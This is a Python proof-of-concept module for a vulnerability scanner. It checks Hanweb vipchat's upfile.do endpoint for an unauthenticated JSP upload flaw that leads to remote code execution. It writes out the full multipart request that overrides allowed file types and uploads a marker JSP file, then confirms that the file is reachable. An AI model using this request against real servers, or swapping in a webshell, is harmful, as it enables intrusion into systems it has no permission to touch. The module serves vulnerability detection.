# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'Hanweb_0003'  # 平台漏洞编号，留空
    name = '大汉网络vipchat上传getshell'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2015-09-25'  # 漏洞公布时间
    desc = '''
        大汉科技（Hanweb）vipchat /vipchat/servlet/upfile.do 文件上传getshell漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0143430'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Hanweb(大汉)'  # 漏洞应用名称
    product_version = '大汉网络vipchat'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '56f9b353-008e-4e8e-9563-2500752f9783'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-22'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer:http://www.wooyun.org/bugs/wooyun-2015-0143430
            hh = hackhttp.hackhttp()
            arg = self.target
            getdata1 = '/vipchat/VerifyCodeServlet?var=clusterid'
            code, head, res, errcode, _ = hh.http(arg + getdata1)
            m1 = re.search('JSESSIONID=(.*?);', head)
            if m1:
                if code != 200:
                    return False
                raw = """
POST /vipchat/servlet/upfile.do HTTP/1.1
Host: www.notedyy.com
Proxy-Connection: keep-alive
Content-Length: 404
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Origin: null
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 SE 2.X MetaSr 1.0
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryUfIZSnIoUZx9mHpA
Accept-Encoding: gzip,deflate
Accept-Language: zh-CN,zh;q=0.8
Cookie: JSESSIONID="""+m1.group(1)+"""

------WebKitFormBoundaryUfIZSnIoUZx9mHpA
Content-Disposition: form-data; name="isdefault"

true
------WebKitFormBoundaryUfIZSnIoUZx9mHpA
Content-Disposition: form-data; name="allowtype"

jsp
------WebKitFormBoundaryUfIZSnIoUZx9mHpA
Content-Disposition: form-data; name="picfile"; filename="1.jsp"
Content-Type: application/octet-stream

just test c4ca4238a0b923820dcc509a6f75849b
------WebKitFormBoundaryUfIZSnIoUZx9mHpA--

"""
                getdata2 = '/vipchat/servlet/upfile.do'
                url = arg + getdata2
                code, head, res, errcode, _ = hh.http(url, raw=raw)
                m = re.search('/vipchat/home/info/(.*?).jsp', res)
                if m:
                    url = arg + m.group(0)
                    code, head, res, errcode, _ = hh.http(url)
                    if code == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in res:
                        #security_hole(arg+getdata2+'   :file upload Vulnerable:')
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
